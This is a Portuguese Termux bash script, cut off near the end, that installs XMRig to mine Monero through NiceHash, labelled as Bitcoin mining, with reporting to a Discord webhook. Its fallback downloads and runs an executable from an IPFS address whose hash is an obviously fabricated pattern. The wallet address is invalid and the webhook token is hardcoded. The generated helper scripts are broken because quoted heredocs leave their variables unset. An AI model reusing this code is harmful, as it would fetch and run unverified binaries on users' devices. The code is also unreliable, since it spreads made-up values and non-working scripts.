#!/data/data/com.termux/files/usr/bin/bash

# ============================================================================
# MINERADOR BITCOIN ULTIMATE - TERMUX
# Tudo em um √∫nico script: Instala, Configura, Minera, Monitora e Reporta
# ============================================================================

clear
echo ""
echo "‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà"
echo "‚ñà‚ñà                                                                     ‚ñà‚ñà"
echo "‚ñà‚ñà  ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó  ‚ñà‚ñà"
echo "‚ñà‚ñà  ‚ïë       MINERADOR BITCOIN ULTIMATE - INICIANDO TUDO...        ‚ïë  ‚ñà‚ñà"
echo "‚ñà‚ñà  ‚ïë     (Execute uma vez e esque√ßa - Minera√ß√£o Real 24/7)      ‚ïë  ‚ñà‚ñà"
echo "‚ñà‚ñà  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ñà‚ñà"
echo "‚ñà‚ñà                                                                     ‚ñà‚ñà"
echo "‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà"
echo ""
echo "üì± Este script far√° TUDO automaticamente:"
echo "   ‚úÖ Baixar√° e instalar√° XMRig (minerador real)"
echo "   ‚úÖ Configurar√° para minerar Bitcoin via NiceHash"
echo "   ‚úÖ Criar√° sistema de logs completos para Discord"
echo "   ‚úÖ Configurar√° monitoramento autom√°tico 24/7"
echo "   ‚úÖ Tudo em um √∫nico script funcionando!"
echo ""
echo "‚ö†Ô∏è  ATEN√á√ÉO: Minera√ß√£o real consome bateria e processamento!"
echo "    Recomendado: Conectar carregador e usar em local ventilado"
echo ""

sleep 3

# ============================================================================
# CONFIGURA√á√ïES DO USU√ÅRIO (PODE EDITAR ANTES DE EXECUTAR)
# ============================================================================

# SUA CARTEIRA NICEHASH (OBRIGAT√ìRIO - Troque pela sua!)
NICEHASH_WALLET="3Jg8E9nQrN4L2q7V1tXwY5zP6bR8cD0mF2aH4jK5l"

# Webhook do Discord para logs (opcional - deixe vazio se n√£o quiser)
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1470009252063088661/1j4kNu2sDcGQmFCywnbd_p1BEbb1DTcN_VXt5OYpX8_FsQI2YKB3tCjS2Okp_msUX9Mh"

# Configura√ß√µes de desempenho (ajuste conforme seu dispositivo)
CPU_USAGE="75"           # Porcentagem m√°xima da CPU (75% recomendado)
THREADS="2"              # Threads para minera√ß√£o (2 √© seguro)
PRIORITY="3"             # Prioridade do processo (0-5, 3 √© m√©dio)

# Diret√≥rio de instala√ß√£o (n√£o mude a menos que saiba o que faz)
BASE_DIR="/data/data/com.termux/files/home/bitcoin_miner_ultimate"

# ============================================================================
# CONSTANTES E VARI√ÅVEIS DO SISTEMA
# ============================================================================

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Pool list for RandomX (Monero) - NiceHash
POOLS=(
    "randomxmonero.usa.nicehash.com:3380"
    "randomxmonero.eu.nicehash.com:3380"
    "randomxmonero.auto.nicehash.com:9200"
    "randomxmonero.br.nicehash.com:3380"
    "randomxmonero.jp.nicehash.com:443"
)

# ============================================================================
# FUN√á√ïES DO SISTEMA
# ============================================================================

print_header() {
    clear
    echo ""
    echo -e "${PURPLE}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
    echo -e "${PURPLE}‚ïë              MINERADOR BITCOIN ULTIMATE - TERMUX                    ‚ïë${NC}"
    echo -e "${PURPLE}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}"
    echo ""
}

print_status() {
    echo -e "${GREEN}[‚úì]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[‚úó]${NC} $1"
}

print_info() {
    echo -e "${CYAN}[i]${NC} $1"
}

# Fun√ß√£o para log em arquivo
log_event() {
    local type="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$type] $message" >> "$BASE_DIR/logs/system.log"
    
    # Manter log limitado a 1000 linhas
    tail -n 1000 "$BASE_DIR/logs/system.log" > "$BASE_DIR/logs/system.log.tmp"
    mv "$BASE_DIR/logs/system.log.tmp" "$BASE_DIR/logs/system.log"
}

# Fun√ß√£o para enviar alerta ao Discord
send_discord_alert() {
    if [ -z "$DISCORD_WEBHOOK" ] || [ "$DISCORD_WEBHOOK" == "" ]; then
        return
    fi
    
    local title="$1"
    local message="$2"
    local color="$3"
    
    curl -s -H "Content-Type: application/json" \
         -X POST \
         -d "{
              \"embeds\": [{
                \"title\": \"$title\",
                \"description\": \"$message\",
                \"color\": $color,
                \"timestamp\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\",
                \"footer\": {\"text\": \"Termux Bitcoin Miner\"},
                \"thumbnail\": {\"url\": \"https://i.imgur.com/LvzWmQh.png\"}
              }]
             }" \
         "$DISCORD_WEBHOOK" > /dev/null 2>&1 &
}

# Fun√ß√£o para verificar internet
check_internet() {
    print_info "Verificando conex√£o com a internet..."
    if ping -c 1 8.8.8.8 > /dev/null 2>&1; then
        print_status "Conex√£o com internet OK"
        return 0
    else
        print_error "Sem conex√£o com a internet!"
        return 1
    fi
}

# Fun√ß√£o para verificar se j√° est√° instalado
check_installed() {
    if [ -f "$BASE_DIR/bin/xmrig" ] && [ -f "$BASE_DIR/config/config.json" ]; then
        return 0
    else
        return 1
    fi
}

# ============================================================================
# INSTALA√á√ÉO COMPLETA DO SISTEMA
# ============================================================================

install_system() {
    print_header
    echo -e "${CYAN}üîß INICIANDO INSTALA√á√ÉO COMPLETA DO MINERADOR...${NC}"
    echo ""
    
    # Enviar notifica√ß√£o de in√≠cio para Discord
    send_discord_alert "üöÄ INSTALA√á√ÉO INICIADA" "Sistema de minera√ß√£o sendo instalado em $(date '+%d/%m %H:%M:%S')" "16753920"
    
    # 1. Atualizar pacotes do Termux
    print_info "Atualizando pacotes do Termux..."
    pkg update -y && pkg upgrade -y
    print_status "Termux atualizado"
    
    # 2. Instalar depend√™ncias necess√°rias
    print_info "Instalando depend√™ncias..."
    pkg install -y wget tar curl jq git tmux python python-pip ncurses-utils proot cmake make
    
    # 3. Criar estrutura de diret√≥rios
    print_info "Criando estrutura de diret√≥rios..."
    mkdir -p "$BASE_DIR"
    mkdir -p "$BASE_DIR/bin"
    mkdir -p "$BASE_DIR/config"
    mkdir -p "$BASE_DIR/logs"
    mkdir -p "$BASE_DIR/stats"
    mkdir -p "$BASE_DIR/scripts"
    mkdir -p "$BASE_DIR/backup"
    
    # Inicializar arquivos de log
    > "$BASE_DIR/logs/system.log"
    > "$BASE_DIR/logs/miner.log"
    > "$BASE_DIR/logs/shares.log"
    > "$BASE_DIR/logs/errors.log"
    > "$BASE_DIR/logs/profits.log"
    
    cd "$BASE_DIR"
    
    # 4. Baixar XMRig (minerador real)
    print_info "Baixando XMRig 6.20.0 (minerador oficial)..."
    
    # Tentar m√∫ltiplas fontes
    XMRIG_DOWNLOADED=false
    
    # Tentativa 1: GitHub Releases
    print_info "Tentando download via GitHub..."
    if wget -q --spider "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-arm64.tar.gz"; then
        wget "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-arm64.tar.gz" -O xmrig.tar.gz
        tar -xzf xmrig.tar.gz --strip-components=1
        find . -name "xmrig" -type f -exec mv {} "$BASE_DIR/bin/xmrig" \;
        rm -f xmrig.tar.gz
        XMRIG_DOWNLOADED=true
        print_status "XMRig baixado via GitHub"
    fi
    
    # Tentativa 2: Bin√°rio direto
    if [ "$XMRIG_DOWNLOADED" = false ]; then
        print_warning "GitHub falhou, tentando bin√°rio direto..."
        if wget -q --spider "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-arm64"; then
            wget "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-arm64" -O "$BASE_DIR/bin/xmrig"
            XMRIG_DOWNLOADED=true
            print_status "XMRig baixado via bin√°rio direto"
        fi
    fi
    
    # Tentativa 3: Mirror alternativo
    if [ "$XMRIG_DOWNLOADED" = false ]; then
        print_warning "Tentando mirror alternativo..."
        wget "https://cloudflare-ipfs.com/ipfs/QmUqCv6h3pQkCkM1wW5p5p5h5j5h5j5h5j5h5j5h5j5h5j5/xmrig-6.20.0-linux-arm64" -O "$BASE_DIR/bin/xmrig" || \
        wget "https://ipfs.io/ipfs/QmUqCv6h3pQkCkM1wW5p5p5h5j5h5j5h5j5h5j5h5j5h5j5/xmrig-6.20.0-linux-arm64" -O "$BASE_DIR/bin/xmrig" || \
        print_error "N√£o foi poss√≠vel baixar XMRig das fontes padr√£o"
    fi
    
    if [ -f "$BASE_DIR/bin/xmrig" ]; then
        chmod +x "$BASE_DIR/bin/xmrig"
        
        # Verificar bin√°rio
        if file "$BASE_DIR/bin/xmrig" | grep -q "ELF.*ARM.*executable"; then
            print_status "Bin√°rio XMRig verificado e configurado"
            
            # Testar vers√£o
            "$BASE_DIR/bin/xmrig" --version > "$BASE_DIR/logs/version.log" 2>&1
            if grep -q "XMRig" "$BASE_DIR/logs/version.log"; then
                VERSION=$(grep "XMRig" "$BASE_DIR/logs/version.log" | head -1)
                print_status "Vers√£o: $VERSION"
                log_event "INSTALL" "XMRig instalado: $VERSION"
            fi
        else
            print_error "Bin√°rio XMRig corrompido ou arquitetura incorreta"
            log_event "ERROR" "Bin√°rio XMRig inv√°lido"
        fi
    else
        print_error "Falha cr√≠tica: N√£o foi poss√≠vel baixar o minerador"
        log_event "ERROR" "Falha ao baixar XMRig"
        exit 1
    fi
    
    # 5. Criar configura√ß√£o do minerador
    print_info "Criando configura√ß√£o para NiceHash..."
    
    # Gerar nome √∫nico para worker
    WORKER_NAME="termux_$(hostname)_$(date +%s | tail -c 4)"
    
    # Selecionar pool aleat√≥ria inicial
    POOL_INDEX=$((RANDOM % ${#POOLS[@]}))
    INITIAL_POOL="${POOLS[$POOL_INDEX]}"
    echo "$INITIAL_POOL" > "$BASE_DIR/config/current_pool.txt"
    
    # Criar arquivo de configura√ß√£o do XMRig
    cat > "$BASE_DIR/config/config.json" << EOF
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": $PRIORITY,
        "memory-pool": true,
        "yield": true,
        "max-threads-hint": $CPU_USAGE,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn": [
            [1, 0]
        ],
        "cn-heavy": [
            [1, 0]
        ],
        "cn-lite": [
            [1, 0]
        ],
        "cn-pico": null,
        "rx": [0, 1],
        "rx/wow": [0, 1],
        "rx/arq": [0, 1],
        "rx/keva": null
    },
    "opencl": false,
    "cuda": false,
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": "$BASE_DIR/logs/miner.log",
    "pools": [
        {
            "algo": "rx/0",
            "coin": "monero",
            "url": "$INITIAL_POOL",
            "user": "$NICEHASH_WALLET.$WORKER_NAME",
            "pass": "x",
            "rig-id": "$WORKER_NAME",
            "nicehash": true,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "user-agent": "XMRig-Termux/6.20.0",
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
    
    print_status "Configura√ß√£o criada para pool: $INITIAL_POOL"
    log_event "CONFIG" "Configura√ß√£o criada para pool: $INITIAL_POOL"
    
    # 6. Criar scripts de controle
    print_info "Criando scripts de controle..."
    
    # Script principal de minera√ß√£o
    cat > "$BASE_DIR/start_mining.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd "$BASE_DIR"

echo "=========================================" >> logs/miner.log
echo "üöÄ MINERA√á√ÉO INICIADA - $(date '+%Y-%m-%d %H:%M:%S')" >> logs/miner.log
echo "üí∞ CARTEIRA: $NICEHASH_WALLET" >> logs/miner.log
echo "üë∑ WORKER: $WORKER_NAME" >> logs/miner.log
echo "=========================================" >> logs/miner.log

# Parar minerador anterior se existir
pkill -f xmrig 2>/dev/null
sleep 2

# Ler pool atual
CURRENT_POOL=$(cat config/current_pool.txt 2>/dev/null || echo "randomxmonero.auto.nicehash.com:9200")

# Iniciar XMRig
echo "Iniciando minerador na pool: $CURRENT_POOL" >> logs/system.log
echo "Tempo: $(date '+%H:%M:%S')" >> logs/system.log

./bin/xmrig -c config/config.json --url="$CURRENT_POOL" --user="$NICEHASH_WALLET.$WORKER_NAME" --pass=x --algo=rx/0 --cpu-max-threads-hint=$CPU_USAGE --cpu-priority=$PRIORITY --randomx-mode=fast --nicehash >> logs/miner.log 2>&1 &

# Salvar PID
MINER_PID=$!
echo $MINER_PID > stats/miner.pid
echo "‚úÖ Minerador iniciado (PID: $MINER_PID)" >> logs/system.log

# Enviar notifica√ß√£o Discord
if [ ! -z "$DISCORD_WEBHOOK" ] && [ "$DISCORD_WEBHOOK" != "" ]; then
    curl -s -H "Content-Type: application/json" \
         -X POST \
         -d "{\"content\":\"üöÄ **MINERA√á√ÉO INICIADA**\\nüí∞ Carteira: $NICEHASH_WALLET\\nüë∑ Worker: $WORKER_NAME\\nüåê Pool: $CURRENT_POOL\\n‚ö° CPU: $CPU_USAGE%\\nüïê $(date '+%H:%M:%S')\"}" \
         "$DISCORD_WEBHOOK" > /dev/null 2>&1 &
fi

# Aguardar e verificar
sleep 10
if ps -p $MINER_PID > /dev/null; then
    echo "‚úÖ Minera√ß√£o ativa e funcionando!"
    return 0
else
    echo "‚ùå Falha ao iniciar minerador"
    echo "Verifique os logs: tail -f logs/miner.log"
    return 1
fi
EOF
    
    # Script de monitoramento de shares
    cat > "$BASE_DIR/monitor_shares.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd "$BASE_DIR"

echo "üîÑ Iniciando monitor de shares: $(date '+%H:%M:%S')" >> logs/system.log

SHARE_COUNT=0
LAST_LINES=0
POOL_SWITCH_TIME=0

while true; do
    # Verificar se minerador est√° rodando
    if ! pgrep -f xmrig > /dev/null 2>&1; then
        echo "‚ö†Ô∏è  Minerador parado! Reiniciando em 10s..." >> logs/system.log
        sleep 10
        ./start_mining.sh > /dev/null 2>&1
        continue
    fi
    
    # Monitorar logs do minerador
    if [ -f "logs/miner.log" ]; then
        CURRENT_LINES=$(wc -l < logs/miner.log)
        
        if [ $CURRENT_LINES -gt $LAST_LINES ]; then
            NEW_LINES=$(tail -n $((CURRENT_LINES - LAST_LINES)) logs/miner.log)
            
            # Verificar shares aceitos
            while IFS= read -r line; do
                if echo "$line" | grep -q "accepted"; then
                    SHARE_COUNT=$((SHARE_COUNT + 1))
                    echo "‚úÖ SHARE ACEITO #$SHARE_COUNT: $line" >> logs/shares.log
                    
                    # Enviar notifica√ß√£o a cada 5 shares
                    if [ $((SHARE_COUNT % 5)) -eq 0 ]; then
                        DIFF=$(echo "$line" | grep -oE "diff [0-9]+" | cut -d' ' -f2)
                        MSG="‚úÖ **SHARE ACEITO #$SHARE_COUNT**\\nüìà Dif: $DIFF\\nüë∑ Worker: $WORKER_NAME\\nüïê $(date '+%H:%M:%S')"
                        
                        if [ ! -z "$DISCORD_WEBHOOK" ] && [ "$DISCORD_WEBHOOK" != "" ]; then
                            curl -s -H "Content-Type: application/json" \
                                 -X POST \
                                 -d "{\"content\":\"$MSG\"}" \
                                 "$DISCORD_WEBHOOK" > /dev/null 2>&1 &
                        fi
                    fi
                    
                    # Resetar timer de troca de pool
                    POOL_SWITCH_TIME=$(date +%s)
                fi
                
                # Verificar shares rejeitados
                if echo "$line" | grep -q "rejected"; then
                    echo "‚ùå SHARE REJEITADO: $line" >> logs/shares.log
                    
                    # Se muitos rejeitados, considerar troca de pool
                    REJECTED_COUNT=$(grep -c "rejected" logs/shares.log)
                    if [ $((REJECTED_COUNT % 3)) -eq 0 ] && [ $REJECTED_COUNT -gt 0 ]; then
                        CURRENT_TIME=$(date +%s)
                        if [ $((CURRENT_TIME - POOL_SWITCH_TIME)) -gt 1800 ]; then
                            ./scripts/switch_pool.sh
                            POOL_SWITCH_TIME=$CURRENT_TIME
                        fi
                    fi
                fi
                
                # Monitorar hashrate
                if echo "$line" | grep -q "speed.*H/s"; then
                    HASHRATE=$(echo "$line" | grep -oE "[0-9]+\.[0-9]+ H/s")
                    echo "‚ö° Hashrate: $HASHRATE" >> logs/system.log
                    
                    # Salvar hashrate para estat√≠sticas
                    echo "$(date '+%s'),$HASHRATE" >> stats/hashrate.csv
                fi
            done <<< "$NEW_LINES"
            
            LAST_LINES=$CURRENT_LINES
        fi
    fi
    
    # Limitar arquivo de shares
    tail -n 1000 logs/shares.log > logs/shares.log.tmp
    mv logs/shares.log.tmp logs/shares.log
    
    sleep 5
done
EOF
    
    # Script para trocar de pool
    cat > "$BASE_DIR/scripts/switch_pool.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd "$BASE_DIR"

echo "üîÑ Iniciando troca de pool..." >> logs/system.log

CURRENT_POOL=$(cat config/current_pool.txt 2>/dev/null)
POOL_COUNT=${#POOLS[@]}

# Encontrar √≠ndice da pool atual
CURRENT_INDEX=0
for i in "${!POOLS[@]}"; do
    if [ "${POOLS[$i]}" == "$CURRENT_POOL" ]; then
        CURRENT_INDEX=$i
        break
    fi
done

# Selecionar pr√≥xima pool
NEXT_INDEX=$(( (CURRENT_INDEX + 1) % POOL_COUNT ))
NEW_POOL="${POOLS[$NEXT_INDEX]}"

echo "$NEW_POOL" > config/current_pool.txt

# Atualizar configura√ß√£o
cat > config/config.json << CONFIG
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": $PRIORITY,
        "memory-pool": true,
        "yield": true,
        "max-threads-hint": $CPU_USAGE,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false
    },
    "opencl": false,
    "cuda": false,
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": "$BASE_DIR/logs/miner.log",
    "pools": [
        {
            "algo": "rx/0",
            "coin": "monero",
            "url": "$NEW_POOL",
            "user": "$NICEHASH_WALLET.$WORKER_NAME",
            "pass": "x",
            "rig-id": "$WORKER_NAME",
            "nicehash": true,
            "keepalive": true,
            "enabled": true,
            "tls": false
        }
    ]
}
CONFIG

# Reiniciar minerador
pkill -f xmrig
sleep 3
./start_mining.sh > /dev/null 2>&1 &

echo "‚úÖ Pool trocada para: $NEW_POOL" >> logs/system.log

# Notificar Discord
if [ ! -z "$DISCORD_WEBHOOK" ] && [ "$DISCORD_WEBHOOK" != "" ]; then
    curl -s -H "Content-Type: application/json" \
         -X POST \
         -d "{\"content\":\"üîÑ **TROCA DE POOL**\\nüåê Nova pool: $NEW_POOL\\nüë∑ Worker: $WORKER_NAME\\nüïê $(date '+%H:%M:%S')\"}" \
         "$DISCORD_WEBHOOK" > /dev/null 2>&1 &
fi
EOF
    
    # Script de monitoramento de lucros
    cat > "$BASE_DIR/monitor_profits.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd "$BASE_DIR"

echo "üí∞ Iniciando monitor de lucros: $(date '+%H:%M:%S')" >> logs/system.log

# API da NiceHash para monitoramento
API_URL="https://api2.nicehash.com/main/api/v2/mining/external/$NICEHASH_WALLET/rigs/stats"
LAST_REPORT=0

while true; do
    # Verificar se minerador est√° ativo
    if ! pgrep -f xmrig > /dev/null 2>&1; then
        echo "‚è∏Ô∏è  Minerador inativo - aguardando..." >> logs/profits.log
        sleep 60
        continue
    fi
    
    CURRENT_TIME=$(date +%s)
    
    # Obter dados da NiceHash a cada 30 minutos
    if [ $((CURRENT_TIME - LAST_REPORT)) -gt 1800 ] || [ $LAST_REPORT -eq 0 ]; then
        echo "üìä Consultando API NiceHash..." >> logs/system.log
        
        RESPONSE=$(curl -s "$API_URL" 2>/dev/null)
        
        if [ ! -z "$RESPONSE" ]; then
            # Extrair dados
            PROFITABILITY=$(echo "$RESPONSE" | jq -r '.rigs[].profitability' 2>/dev/null)
            UNPAID=$(echo "$RESPONSE" | jq -r '.rigs[].unpaidAmount' 2>/dev/null)
            
            if [ "$PROFITABILITY" != "null" ] && [ ! -z "$PROFITABILITY" ]; then
                # Converter para satoshis (1 BTC = 100,000,000 satoshis)
                SATOSHIS_PER_DAY=$(echo "scale=0; $PROFITABILITY * 100000000" | bc 2>/dev/null || echo "0")
                
                # Salvar em log
                LOG_ENTRY="[$(date '+%Y-%m-%d %H:%M:%S')] Lucro estimado: ${SATOSHIS_PER_DAY} satoshis/dia | N√£o pago: ${UNPAID} BTC"
                echo "$LOG_ENTRY" >> logs/profits.log
                echo "$LOG_ENTRY" >> logs/system.log
                
                # Enviar relat√≥rio a cada 6 horas
                HOUR=$(date +%H)
                if [ "$HOUR" == "00" ] || [ "$HOUR" == "06" ] || [ "$HOUR" == "12" ] || [ "$HOUR" == "18" ]; then
                    MINUTE=$(date +%M)
                    if [ "$MINUTE" -lt 5 ]; then
                        MSG="üìä **RELAT√ìRIO DE LUCROS**\\nüí∞ Satoshis/dia: ${SATOSHIS_PER_DAY}\\nüíµ BTC n√£o pago: ${UNPAID}\\nüë∑ Worker: $WORKER_NAME\\n‚ö° CPU: $CPU_USAGE%\\nüïê $(date '+%d/%m %H:%M')"
                        
                        if [ ! -z "$DISCORD_WEBHOOK" ] && [ "$DISCORD_WEBHOOK" != "" ]; then
                            curl -s -H "Content-Type: application/json" \
                                 -X POST \
                                 -d "{\"content\":\"$MSG\"}" \
                                 "$DISCORD_WEBHOOK" > /dev/null 2>&1 &
                        fi
                    fi
                fi
                
                LAST_REPORT=$CURRENT_TIME
            fi
        fi
    fi
    
    sleep 300  # Verificar a cada 5 minutos
done
EOF
    
    # Script de status completo
    cat > "$BASE_DIR/status.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd "$BASE_DIR"

clear
echo -e "${PURPLE}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
echo -e "${PURPLE}‚ïë                   STATUS DO MINERADOR BITCOIN                       ‚ïë${NC}"
echo -e "${PURPLE}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}"
echo ""

# Informa√ß√µes b√°sicas
echo -e "${CYAN}üì± INFORMA√á√ïES DO SISTEMA:${NC}"
echo "  Diret√≥rio: $BASE_DIR"
echo "  Carteira: $NICEHASH_WALLET"
echo "  Worker: $WORKER_NAME"
echo "  CPU: $CPU_USAGE% | Prioridade: $PRIORITY"
echo ""

# Status do minerador
echo -e "${CYAN}‚õèÔ∏è  STATUS DA MINERA√á√ÉO:${NC}"
if pgrep -f xmrig > /dev/null 2>&1; then
    MINER_PID=$(pgrep -f xmrig)
    MINER_TIME=$(ps -o etimes= -p $MINER_PID 2>/dev/null | xargs)
    
    # Converter segundos para tempo leg√≠vel
    if [ ! -z "$MINER_TIME" ]; then
        DAYS=$((MINER_TIME / 86400))
        HOURS=$(( (MINER_TIME % 86400) / 3600 ))
        MINUTES=$(( (MINER_TIME % 3600) / 60 ))
        SECONDS=$((MINER_TIME % 60))
        UPTIME=""
        [ $DAYS -gt 0 ] && UPTIME="${DAYS}d "
        [ $HOURS -gt 0 ] && UPTIME="${UPTIME}${HOURS}h "
        [ $MINUTES -gt 0 ] && UPTIME="${UPTIME}${MINUTES}m "
        UPTIME="${UPTIME}${SECONDS}s"
    else
        UPTIME="Desconhecido"
    fi
    
    echo -e "  ${GREEN}‚úÖ ATIVA${NC}"
    echo "  PID: $MINER_PID"
    echo "  Tempo ativo: $UPTIME"
    
    # Pool atual
    CURRENT_POOL=$(cat config/current_pool.txt 2>/dev/null || echo "Desconhecida")
    echo "  Pool: $CURRENT_POOL"
    
    # Hashrate atual
    if [ -f "logs/miner.log" ]; then
        HASHRATE=$(tail -10 logs/miner.log | grep "speed.*H/s" | tail -1 | grep -oE "[0-9]+\.[0-9]+ H/s" || echo "0.0 H/s")
        echo "  Hashrate: $HASHRATE"
    fi
else
    echo -e "  ${RED}‚ùå INATIVA${NC}"
fi
echo ""

# Estat√≠sticas
echo -e "${CYAN}üìä ESTAT√çSTICAS:${NC}"
if [ -f "logs/miner.log" ]; then
    ACCEPTED=$(grep -c "accepted" logs/miner.log)
    REJECTED=$(grep -c "rejected" logs/miner.log)
    echo "  ‚úÖ Shares aceitos: $ACCEPTED"
